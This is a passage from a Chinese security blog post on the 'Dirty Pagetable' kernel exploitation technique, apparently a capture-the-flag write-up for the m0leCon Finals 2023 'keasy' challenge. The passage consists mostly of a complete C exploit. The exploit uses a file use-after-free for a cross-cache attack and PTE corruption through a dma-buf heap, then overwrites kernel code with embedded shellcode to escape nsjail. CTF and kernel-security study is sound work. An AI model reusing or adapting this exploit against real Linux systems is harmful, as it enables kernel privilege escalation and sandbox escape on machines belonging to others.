CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">    output_msg(<span class="string">&quot;Process binded to core&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs,user_ss,user_sp,user_rflags;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] status has been saved!\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this is a universal function to print binary data from a char* array</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">void</span> *addr, <span class="type">int</span> len)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> *buf64 = (<span class="type">size_t</span> *) addr;</span><br><span class="line">    <span class="type">char</span> *buf8 = (<span class="type">char</span> *) addr;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">2</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">  <span class="type">int</span> fd = open(<span class="string">&quot;/dev/sda&quot;</span>, O_RDONLY);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[-] Lose...&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Win!&quot;</span>);</span><br><span class="line">    read(fd, buf, <span class="number">0x100</span>);</span><br><span class="line">    write(<span class="number">1</span>, buf, <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Done&quot;</span>);</span><br><span class="line">    pause();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">debug</span><span class="params">(<span class="type">char</span> *info)</span></span><br><span class="line">&#123;</span><br><span class="line">    output_msg(info);</span><br><span class="line">    getchar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_SPRAYNUM 0x100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SPRAYNUM 0x200</span></span><br><span class="line"><span class="type">int</span> dmafd;</span><br><span class="line"><span class="type">int</span>  keasy_fd;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> uaf_fd;</span><br><span class="line">    <span class="type">char</span>* spray_fd[FILE_SPRAYNUM];</span><br><span class="line">    <span class="type">char</span>* spray_page[PAGE_SPRAYNUM];</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    save_status();</span><br><span class="line">    keasy_fd = open(<span class="string">&quot;/dev/keasy&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (keasy_fd &lt; <span class="number">0</span>) err_msg(<span class="string">&quot;Fail open keasy&quot;</span>);</span><br><span class="line">    dmafd = open(<span class="string">&quot;/dev/dma_heap/system&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (dmafd &lt; <span class="number">0</span>) err_msg(<span class="string">&quot;Fail open dma_heap&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// This step is to prepare spray PTEs the follow</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PAGE_SPRAYNUM; i++)&#123;</span><br><span class="line">        spray_page[i] = mmap((<span class="type">void</span> *)(<span class="number">0xdead0000</span>UL + i*(<span class="number">0x10000</span>UL)),</span><br><span class="line">                            <span class="number">0x8000</span>, PROT_READ | PROT_WRITE,</span><br><span class="line">                            MAP_ANONYMOUS | MAP_SHARED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (spray_page[i] == MAP_FAILED) err_msg(<span class="string">&quot;fail to mmap space&quot;</span>);    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    *   STEP.1 Spray the filp objects</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    output_msg (<span class="string">&quot;STEP.1 Spray file structs completely!&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; FILE_SPRAYNUM/<span class="number">2</span>; i++)&#123;</span><br><span class="line">        spray_fd[i] = open(<span class="string">&quot;/&quot;</span>, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span> (spray_fd[i] &lt; <span class="number">0</span>) err_msg(<span class="string">&quot;fail open /.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// get uaf filp struct when the operation of copy_to_user failure</span></span><br><span class="line">    uaf_fd = spray_fd[FILE_SPRAYNUM/<span class="number">2</span><span class="number">-1</span>] + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(keasy_fd, <span class="number">0</span>, <span class="number">0xdeadbeef</span>) == <span class="number">0</span>) err_msg(<span class="string">&quot;fail uaf&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = FILE_SPRAYNUM/<span class="number">2</span>; i &lt; FILE_SPRAYNUM; i++)&#123;</span><br><span class="line">        spray_fd[i] = open(<span class="string">&quot;/&quot;</span>, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span> (spray_fd[i] &lt; <span class="number">0</span>) err_msg(<span class="string">&quot;fail open /.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    *   STEP.2 Release all the filp struct to construct Cross Cache Attack</span></span><br><span class="line"><span class="comment">    *   object: clear the slab page and return it to page allocator</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    output_msg (<span class="string">&quot;STEP.2 Release all the filp struct&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; FILE_SPRAYNUM; i++)&#123;</span><br><span class="line">        close(spray_fd[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    *   STEP.3 Spray PTEs to fill the victim slab of victim UAF filp object </span></span><br><span class="line"><span class="comment">    *   Notion: Dont forget alloc dma_buf_heap</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    output_msg (<span class="string">&quot;STEP.3 Spray PTEs to fill the victim slab of victim UAF filp object&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PAGE_SPRAYNUM/<span class="number">2</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)</span><br><span class="line">            *(<span class="type">char</span> *)(spray_page[i] + j*<span class="number">0x1000</span>) = <span class="string">&#x27;A&#x27;</span> + j;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// alloc dma-buf heap which is same as the order of pages of a page table</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dma_heap_allocation_data</span> <span class="title">data</span>;</span></span><br><span class="line">    data.len = <span class="number">0x1000</span>;</span><br><span class="line">    data.fd_flags = O_RDWR;</span><br><span class="line">    data.heap_flags = <span class="number">0</span>;</span><br><span class="line">    data.fd = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ioctl(dmafd, DMA_HEAP_IOCTL_ALLOC, &amp;data) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;DMA_HEAP_IOCTL_ALLOC&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> dma_buf_fd = data.fd;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Dma_buf_fd ==&gt; %d\n&quot;</span>, dma_buf_fd);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = PAGE_SPRAYNUM/<span class="number">2</span>; i &lt; PAGE_SPRAYNUM; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)</span><br><span class="line">            *(<span class="type">char</span> *)(spray_page[i] + j*<span class="number">0x1000</span>) = <span class="string">&#x27;A&#x27;</span> + j;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    *   STEP.4 Find corrupt PTE by dup(uaf_fd) 0x1000 times</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    output_msg (<span class="string">&quot;STEP.4 Try to find corrupt PTE&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)&#123;</span><br><span class="line">        dup(uaf_fd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> *evil_page = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PAGE_SPRAYNUM; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (*(<span class="type">char</span> *)(spray_page[i] + <span class="number">7</span>*<span class="number">0x1000</span>) != <span class="string">&#x27;A&#x27;</span> + <span class="number">7</span>)&#123;</span><br><span class="line">            evil_page = (<span class="type">char</span> *)(spray_page[i] + <span class="number">7</span>*<span class="number">0x1000</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] The %dth content of corrupt page now:  %s\n&quot;</span>, i, evil_page);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] Find corrupt page %p\n&quot;</span>, evil_page);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    *   STEP.5 Arbitrary physical Address Read/Write by overwrite PTE</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    output_msg (<span class="string">&quot;STEP.5 Arbitrary physical Address Read/Write by overwrite PTE&quot;</span>);</span><br><span class="line">    munmap(evil_page, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="type">char</span> *dma_buf = mmap(evil_page, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, </span><br><span class="line">                        MAP_POPULATE | MAP_SHARED, dma_buf_fd, <span class="number">0</span>);  <span class="comment">//ATTATION NOT MAP_ANONYMOUS</span></span><br><span class="line">    dma_buf[<span class="number">0</span>] = <span class="string">&#x27;a&#x27;</span>;                   <span class="comment">//get mapping relation</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Dma_buf&#x27;s content is: %p\n&quot;</span>, *(<span class="type">size_t</span> *)&amp;dma_buf[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)&#123;</span><br><span class="line">        dup(uaf_fd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">size_t</span> *)&amp;dma_buf[<span class="number">0</span>] &lt; <span class="number">0xff</span>) err_msg(<span class="string">&quot;Fail leak, plz try again&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] After dup the dma_buf&#x27;s content is: %p\n&quot;</span>, *(<span class="type">size_t</span> *)&amp;dma_buf[<span class="number">0</span>]);</span><br><span class="line">    <span class="comment">// modify PTE with dma_buf to leak p_kernel_base</span></span><br><span class="line">    *(<span class="type">size_t</span> *)&amp;dma_buf[<span class="number">0</span>] = <span class="number">0x800000000009c067</span>;    </span><br><span class="line"></span><br><span class="line">    <span class="comment">// find corrupt PTE</span></span><br><span class="line">    <span class="type">char</span> *arbitrary_read_write_page = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PAGE_SPRAYNUM; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (*(<span class="type">char</span> *)spray_page[i] != <span class="string">&#x27;A&#x27;</span>)&#123;</span><br><span class="line">            arbitrary_read_write_page = spray_page[i];</span><br><span class="line">            output_msg(<span class="string">&quot;Find corrupt PTE and you can begin to exploit it&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] Corrupt pte addr ==&gt; %p\n&quot;</span>, arbitrary_read_write_page);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> p_kernel_addr = *(<span class="type">size_t</span> *)arbitrary_read_write_page &amp; ~<span class="number">0xfff</span>;</span><br><span class="line">    <span class="type">size_t</span> p_kernel_base = p_kernel_addr - <span class="number">0x1c04000</span>;</span><br><span class="line">    print_addr(<span class="string">&quot;physical kernel_base addr&quot;</span>, p_kernel_base);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    *   STEP.6 Escaping from nsjail</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="type">size_t</span> phys_func = p_kernel_base + <span class="number">0x24d4c0</span>;</span><br><span class="line">    *(<span class="type">size_t</span>*)dma_buf = (phys_func &amp; ~<span class="number">0xfff</span>) | <span class="number">0x8000000000000067</span>;</span><br><span class="line">    <span class="type">char</span> shellcode[] = &#123;</span><br><span class="line">        <span class="number">0xf3</span>, <span class="number">0x0f</span>, <span class="number">0x1e</span>, <span class="number">0xfa</span>, <span class="number">0xe8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x5f</span>, <span class="number">0x49</span>, <span class="number">0x81</span>, <span class="number">0xef</span>, <span class="number">0xc9</span>,</span><br><span class="line">        <span class="number">0xd4</span>, <span class="number">0x24</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x8d</span>, <span class="number">0xbf</span>, <span class="number">0xd8</span>, <span class="number">0x5e</span>, <span class="number">0x44</span>, <span class="number">0x01</span>, <span class="number">0x49</span>, <span class="number">0x8d</span>, <span class="number">0x87</span>, <span class="number">0x20</span>, <span class="number">0xe6</span>,</span><br><span class="line">        <span class="number">0x0a</span>, <span class="number">0x00</span>, <span class="number">0xff</span>, <span class="number">0xd0</span>, <span class="number">0xbf</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x8d</span>, <span class="number">0x87</span>, <span class="number">0x50</span>, <span class="number">0x37</span>, <span class="number">0x0a</span>,</span><br><span class="line">        <span class="number">0x00</span>, <span class="number">0xff</span>, <span class="number">0xd0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xc7</span>, <span class="number">0x49</span>, <span class="number">0x8d</span>, <span class="number">0xb7</span>, <span class="number">0xe0</span>, <span class="number">0x5c</span>, <span class="number">0x44</span>, <span class="number">0x01</span>, <span class="number">0x49</span>, <span class="number">0x8d</span>,</span><br><span class="line">        <span class="number">0x87</span>, <span class="number">0x40</span>, <span class="number">0xc1</span>, <span class="number">0x0a</span>, <span class="number">0x00</span>, <span class="number">0xff</span>, <span class="number">0xd0</span>, <span class="number">0x49</span>, <span class="number">0x8d</span>, <span class="number">0xbf</span>, <span class="number">0x48</span>, <span class="number">0x82</span>, <span class="number">0x53</span>, <span class="number">0x01</span>, <span class="number">0x49</span>,</span><br><span class="line">        <span class="number">0x8d</span>, <span class="number">0x87</span>, <span class="number">0x90</span>, <span class="number">0xf8</span>, <span class="number">0x27</span>, <span class="number">0x00</span>, <span class="number">0xff</span>, <span class="number">0xd0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xc3</span>, <span class="number">0x48</span>, <span class="number">0xbf</span>, <span class="number">0x11</span>, <span class="number">0x11</span>,</span><br><span class="line">        <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x49</span>, <span class="number">0x8d</span>, <span class="number">0x87</span>, <span class="number">0x50</span>, <span class="number">0x37</span>, <span class="number">0x0a</span>, <span class="number">0x00</span>, <span class="number">0xff</span>, <span class="number">0xd0</span>,</span><br><span class="line">        <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x98</span>, <span class="number">0x40</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x04</span>, <span class="number">0x24</span>, <span class="number">0x48</span>, <span class="number">0x89</span>,</span><br><span class="line">        <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x08</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x48</span>, <span class="number">0x89</span>,</span><br><span class="line">        <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x10</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x48</span>, <span class="number">0x89</span>,</span><br><span class="line">        <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x18</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x44</span>, <span class="number">0x48</span>, <span class="number">0x89</span>,</span><br><span class="line">        <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x20</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x55</span>, <span class="number">0x48</span>, <span class="number">0x89</span>,</span><br><span class="line">        <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x28</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x89</span>,</span><br><span class="line">        <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x30</span>, <span class="number">0x49</span>, <span class="number">0x8d</span>, <span class="number">0x87</span>, <span class="number">0x41</span>, <span class="number">0x0f</span>, <span class="number">0xc0</span>, <span class="number">0x00</span>, <span class="number">0xff</span>, <span class="number">0xe0</span>, <span class="number">0xcc</span> &#125;;</span><br><span class="line">    <span class="type">void</span> *p;</span><br><span class="line">    p = memmem(shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="string">&quot;\x11\x11\x11\x11\x11\x11\x11\x11&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)p = getpid();</span><br><span class="line">    p = memmem(shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="string">&quot;\x22\x22\x22\x22\x22\x22\x22\x22&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)p = (<span class="type">size_t</span>)&amp;win;</span><br><span class="line">    p = memmem(shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="string">&quot;\x33\x33\x33\x33\x33\x33\x33\x33&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)p = user_cs;</span><br><span class="line">    p = memmem(shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="string">&quot;\x44\x44\x44\x44\x44\x44\x44\x44&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)p = user_rflags;</span><br><span class="line">    p = memmem(shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="string">&quot;\x55\x55\x55\x55\x55\x55\x55\x55&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)p = user_sp;</span><br><span class="line">    p = memmem(shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="string">&quot;\x66\x66\x66\x66\x66\x66\x66\x66&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)p = user_ss;</span><br><span class="line">    <span class="built_in">memcpy</span>(arbitrary_read_write_page + (phys_func &amp; <span class="number">0xfff</span>), shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] you got it&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, symlink(<span class="string">&quot;/jail/x&quot;</span>, <span class="string">&quot;/jail&quot;</span>));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[-] Fail&quot;</span>);</span><br><span class="line">    <span class="comment">// close(fd);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// debug(&quot;p2&quot;); //for debug</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+<h4 id=""><a href="#" class="headerlink" title=""></a></h4><h4 id="-1"><a href="#-1" class="headerlink" title=""></a></h4><h4 id="-2"><a href="#-2" class="headerlink" title=""></a></h4><h4 id="-3"><a href="#-3" class="headerlink" title=""></a></h4><h4 id="-4"><a href="#-4" class="headerlink" title=""></a></h4>
+        </div>
+
+        
+            <div class="post-copyright-info my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Dirty Pagetable 学习 &amp; 例题</li>
+        <li><strong>Author:</strong> henry</li>
+        <li><strong>Created at
+                :</strong> 2024-04-10 23:06:34</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-04-10 23:11:24
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://henrymartin262.github.io/2024/04/10/Dirty-pagetable-study/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/kernel/">#kernel</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/heap/">#heap</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/cache/">#cache</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/uaf/">#uaf</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Cross-Cache-attack/">#Cross-Cache attack</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/pagetable/">#pagetable</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/dma-buf-heap/">#dma_buf_heap</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/04/10/Cross-Cache-Attack/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Cross-Cache Attack 学习笔记</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container pjax">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fa-solid fa-comments"></i>&nbsp;Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          requiredMeta: ['nick', 'mail']
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Dirty Pagetable 学习 &amp; 例题</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Dirty-Pagetable-%E5%AD%A6%E4%B9%A0-%E4%BE%8B%E9%A2%98"><span class="nav-text">Dirty Pagetable 学习 &amp; 例题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-Dirty-Pagetable-%E4%BB%8B%E7%BB%8D"><span class="nav-text">1. Dirty Pagetable 介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-Dirty-Pagetable-%E5%8E%9F%E7%90%86%E6%AD%A5%E9%AA%A4"><span class="nav-text">2. Dirty Pagetable 原理步骤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E9%80%9A%E8%BF%87-file-UAF-%E5%88%A9%E7%94%A8-Dirty-Pagetable"><span class="nav-text">3. 通过 file UAF 利用 Dirty Pagetable</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E4%BE%8B%E9%A2%98-m0leCon-Finals-2023-keasy"><span class="nav-text">4. 例题 m0leCon Finals 2023-keasy</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="nav-text">静态分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="nav-text">漏洞点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="nav-text">利用过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90"><span class="nav-text">利用分析</span></a></li></ol></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
